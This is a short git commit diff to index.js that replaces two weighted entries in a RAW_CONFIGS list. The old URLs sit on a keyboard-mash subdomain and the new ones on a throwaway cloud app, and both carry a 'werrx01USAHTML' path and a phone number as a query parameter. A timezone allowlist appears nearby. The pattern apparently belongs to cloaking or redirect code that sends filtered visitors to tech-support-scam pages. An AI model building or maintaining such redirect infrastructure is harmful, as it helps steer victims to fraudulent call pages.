a45bd48f218c344134ea09c86894bbbd0915d6a5
paalakash <palaksh452@gmail.com>
2026-06-03 07:35:15 +0530

    Update RAW_CONFIGS URLs to new endpoints

--- index.js
+++ index.js
@@ -31,8 +31,8 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://uytrewasdfghj.on-forge.com/werrx01USAHTML/?bcda=1800 209 169", weight: 0.5 },
-    { url: "https://uytrewasdfghj.on-forge.com/werrx01USAHTML/?bcda=1800 209 169", weight: 0.5 }
+    { url: "https://orca-app-2hyk2.ondigitalocean.app/werrx01USAHTML/?bcda=1800-209-169", weight: 0.5 },
+    { url: "https://orca-app-2hyk2.ondigitalocean.app/werrx01USAHTML/?bcda=1800-209-169", weight: 0.5 }
 
 ];
 
